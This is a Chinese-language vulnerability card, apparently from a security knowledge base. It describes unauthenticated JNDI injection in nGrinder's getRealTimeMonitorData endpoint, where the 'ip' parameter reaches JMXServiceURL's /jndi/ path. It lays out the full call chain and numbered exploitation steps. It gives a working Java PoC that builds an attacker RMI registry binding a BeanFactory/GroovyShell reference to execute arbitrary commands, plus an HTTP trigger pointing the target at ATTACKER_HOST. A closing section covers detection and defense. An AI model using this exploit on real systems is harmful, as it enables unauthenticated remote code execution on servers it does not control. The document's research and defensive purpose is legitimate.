---
id: web-java-deser-jndi-ngrinder-monitor-jmx-url
title: nGrinder 未授权监控接口 ip 参数注入 JMXServiceURL 的 /jndi/ 路径：RMIConnector 经 InitialContext.lookup 触发 JNDI RCE
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jmxserviceurl-urlpath-jndi-injection
aliases:
- nGrinder JNDI 注入
- nGrinder 未授权 RCE
- getRealTimeMonitorData JNDI
- MBeanClient JNDI 注入
- JMXServiceURL /jndi/ 注入
- MonitorManagerApiController 未授权
tags:
- java
- jndi
- jmx
- rmi
- beanfactory
- groovy
- ngrinder
- unauth
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V579
  verified_at: '2026-11-12T12:26:59+08:00'
  notes: 已对照原文294行与2张截图核对：图01 MBeanClient 构造 new JMXServiceURL("rmi",host,port,String.format(JMX_URI,...)) 与图02 JMX_URI="/jndi/rmi://%s:%s/jmxrmi" 均与卡片一致；getRealTimeMonitorData→getAsyncSystemInfo→MonitorInfoStore.getSystemInfo→MonitorClientService.init→MBeanClient.connect→connectWithTimeout→RMIConnector.findRMIServer /jndi/分支→findRMIServerJNDI→InitialContext.lookup 调用链逐段与原文代码吻合；ip 参数在 host 与 path 占位符均可控，端口为目标 monitorPort(默认13243)的约束在卡片中已准确指出；高版本 BeanFactory+GroovyShell ResourceRef PoC 与原文一致，卡片还对原文 bind 名写成 rmi://... 的不严谨处做了纠正说明；原文未给接口完整路由与成功回连截图，卡片如实注明并标 confidence medium。dedup：top为自身；rmiconnector卡为反序列化gadget入口、beanfactory-el卡为同链内本地工厂细节，均非同链，dedup_review成立；dup-scan无该卡pair。原文未标注 nGrinder 版本，affected_versions 为空正确。未验证点：未复跑PoC，/jndi/分支在高版本JDK的可用性待按目标核验。
---

## 一句话结论

nGrinder 的 `MonitorManagerApiController#getRealTimeMonitorData` 没有 `@PreAuthorize` 权限校验，匿名攻击者可控的 `ip` 参数被直接拼进 JMX 服务 URL 的路径（`JMX_URI = "/jndi/rmi://%s:%s/jmxrmi"`）；`JMXConnectorFactory.connect` 进入 `RMIConnector.findRMIServer` 的 `/jndi/` 分支后执行 `new InitialContext(env).lookup(...)`，攻击者在目标 monitorPort（release war 默认 13243）上搭一个返回 Tomcat `BeanFactory` + `groovy.lang.GroovyShell` 的 RMI Registry，即可在未经认证的情况下执行命令。

## 原理

- **未授权入口**：nGrinder 用 Spring Security 的 `@PreAuthorize` 注解做权限校验（控制器方法参数为 `User` 实体时也会强制校验）。`getRealTimeMonitorData(@RequestParam final String ip)` 两者都不满足，因此是匿名可达接口。文章经审计排除后，把 `StatisticsApiController` 与 `UserSignUpApiController`（默认不开启）之外的未授权接口作为攻击面。
- **完整调用链**：
  - `getRealTimeMonitorData(ip)` 从配置取 `port = config.getMonitorPort()`（release war 默认 13243），调用 `getAsyncSystemInfo(ip, port)` → `MonitorInfoStore#getSystemInfo(ip, port)`；
  - 若 `monitorClientMap` 中没有该 ip，则 `new MonitorClientService(ip, port).init()`；
  - `MonitorClientService#init` 创建 `new MBeanClient(ip, port)` 并调用 `connect()`；
  - `MBeanClient` 构造器执行 `new JMXServiceURL("rmi", hostName, port, String.format(JMX_URI, hostName, port))`，四参构造把 URL 拼成 `service:jmx:rmi://<ip>:<port>/jndi/rmi://<ip>:<port>/jmxrmi`；
  - `MBeanClient#connect` → `connectClient`（jmxUrl 非 null 且非 localhost:0）→ `connectWithTimeout`，在独立线程里调用 `JMXConnectorFactory.connect(jmxUrl)`；
  - 一路进入 `javax.management.remote.rmi.RMIConnector#findRMIServer`：取 `getURLPath()`，按前缀分派，`/jndi/` 分支调用 `findRMIServerJNDI(path.substring(6), env)`；
  - `findRMIServerJNDI` 执行 `new InitialContext(env).lookup(jndiURL)`，`jndiURL` 即 `rmi://<ip>:<port>/jmxrmi`，其中 ip 完全来自请求参数。
- **为什么成立**：JMX 客户端把 `JMXServiceURL` 的路径当作可信输入，`/jndi/` 前缀是 JMX 为兼容 JNDI 定位而保留的分支，路径剩余部分被原样交给 `InitialContext.lookup`，没有协议/主机白名单。由于 nGrinder 用四参 `JMXServiceURL` 构造并把 `ip` 同时写入 host 与路径占位符，攻击者只需控制 `ip` 即可让目标 RMI/JNDI 连接的回连地址变成自己的主机；路径中的端口来自服务端配置，因此攻击者的 Registry 必须监听同一端口号。
- **异常不影响利用**：`MBeanClient#connect` 用 `catch (Exception e)` 吞掉连接异常并只记日志，`lookup` 网络请求在异常抛出前已经发出。
- **高版本 JDK 绕过**：不依赖远程 codebase。ngrinder 运行环境自带 Tomcat 与 Groovy 依赖，用 `ResourceRef("groovy.lang.GroovyShell", ..., "org.apache.naming.factory.BeanFactory", null)`（`factoryClassLocation=null`）可绕过高版本 JDK 的 `trustURLCodebase` 检查：Tomcat 的本地 `BeanFactory` 实例化 `GroovyShell`，再按 `forceString` 把属性 `x` 映射到 `evaluate` 方法，`evaluate("'cmd'.execute()")` 最终执行系统命令。

## 触发条件

- 目标 nGrinder（release war）对外可达，且监控接口 `MonitorManagerApiController#getRealTimeMonitorData` 未授权可达（无 `@PreAuthorize`，默认部署即满足）。
- 目标能访问攻击者的 RMI Registry；Registry 监听端口必须等于目标配置的 monitorPort（默认 13243），因为该端口被格式化进 `rmi://<ip>:<port>/jmxrmi`。
- 目标 JDK 的 `RMIConnector` 仍保留 `/jndi/` 分支（文章测试环境可用；更新版本 JDK 是否保留需按目标核验）。
- 高版本 JDK 场景下目标 classpath 需有 `org.apache.naming.factory.BeanFactory`（Tomcat）与 `groovy.lang.GroovyShell`（nGrinder 自带依赖）；低版本 JDK 也可走远程 codebase 的常规 JNDI 利用。

## 利用步骤

1. 确认目标 nGrinder 可达，并按部署配置确认 monitorPort（release 默认 13243）。
2. 攻击者在本地启动 RMI Registry，监听与目标 monitorPort 相同的端口号。
3. 构造 `ResourceRef`：bean 类为 `groovy.lang.GroovyShell`，`forceString` 为 `x=evaluate`，属性 `x` 为 Groovy 脚本 `'<命令>'.execute()`，`factoryClassName` 为 `org.apache.naming.factory.BeanFactory`、`factoryClassLocation` 为 `null`。
4. 把该 Reference 包装为 `ReferenceWrapper` 并绑定到 Registry 的 `jmxrmi` 名称（与 lookup URL 末尾名称对齐）。
5. 向目标监控接口发送 `ip=攻击者地址` 的请求（具体路由以目标源码中 `MonitorManagerApiController` 的类级映射为准，方法名 `getRealTimeMonitorData`、参数名 `ip`）。
6. 目标构造 `JMXServiceURL` 并连接，`/jndi/` 分支触发对攻击者 Registry 的 lookup；`BeanFactory` 实例化 `GroovyShell` 并调用 `evaluate` 执行命令。
7. 以 Registry 访问日志与命令执行结果（DNS/HTTP 回连、文件落地）确认利用成功；nGrinder 侧会记录 monitor 连接异常日志，不影响已发生的 lookup 与命令执行。

## PoC

攻击者侧 RMI Registry（高版本 JDK 本地工厂绕过，命令由参数传入）：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Test {
    public static void main(String[] args) throws Exception {
        int port = Integer.parseInt(args[0]);   // 必须等于目标 monitorPort（默认 13243）
        String cmd = args[1];

        Registry registry = LocateRegistry.createRegistry(port);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", String.format("'%s'.execute()", cmd)));

        registry.bind("jmxrmi", new ReferenceWrapper(ref));
    }
}
```

目标侧触发（路由前缀按源码类级 `@RequestMapping` 补全）：

```http
GET /<MonitorManagerApiController 类级前缀>/getRealTimeMonitorData?ip=ATTACKER_HOST HTTP/1.1
Host: target
```

说明：目标 JMX URL 路径为 `/jndi/rmi://ATTACKER_HOST:<monitorPort>/jmxrmi`，因此 Registry 绑定名应为 `jmxrmi`；文章示例的 bind 名称写作完整 `rmi://...` 字符串，实际以 lookup URL 解析出的名称对齐为准。原文未给出接口完整路由与成功回连截图，本卡未在本机复跑。

## 变体与关联

- 变体：高版本 JDK 的本地工厂绕过可把 `GroovyShell` 换成 `javax.el.ELProcessor`（`forceString x=eval`），见 [[web-java-deserialization-jndi-high-version-beanfactory-el]]；本篇利用 nGrinder 自带的 Groovy 依赖走同一 `BeanFactory` 机制。
- 同 sink、不同入口：[[web-java-deser-rmiconnector-jndi-findrmiserverjndi]] 讲的是用反序列化 gadget 调用 `RMIConnector.connect` 并反射改 `JMXServiceURL.urlPath`；本篇是未授权 HTTP 参数直接控制 `JMXServiceURL` 的 host 与 `/jndi/` 路径，无需反序列化原语。
- 关联：`MonitorInfoStore` 按 ip 缓存 client，重复请求同一 ip 会复用已建连接，测试时换 ip 或等待缓存清理。
- 边界：JDK 移除 `/jndi/` 分支、目标无法访问攻击者端口、`InitialContext` 被全局禁用、或出站被限制时链不成立；`/jndi/` 分支的可用性需按目标 JDK 核验。

## 检测与防御

- 检测：对监控接口的请求中 `ip` 为外部地址；目标进程对固定 monitorPort 发起 RMI/JNDI 出站连接；nGrinder 日志出现 `Timeout while connecting to <ip>:<port> monitor`；Registry 侧收到 `jmxrmi` 的 lookup。
- 防御：给 `getRealTimeMonitorData` 等监控接口补 `@PreAuthorize` 或只允许受信 agent 网段访问监控端口；不要把请求参数直接拼入 `JMXServiceURL`，对 ip 做格式与白名单校验；升级 JDK 到不保留 `/jndi/` 分支的版本；限制应用出站连接；移除不必要的 Groovy 依赖以收紧高版本绕过面。
- 边界：监控功能本身合法，检测需结合未授权访问与异常出站行为。
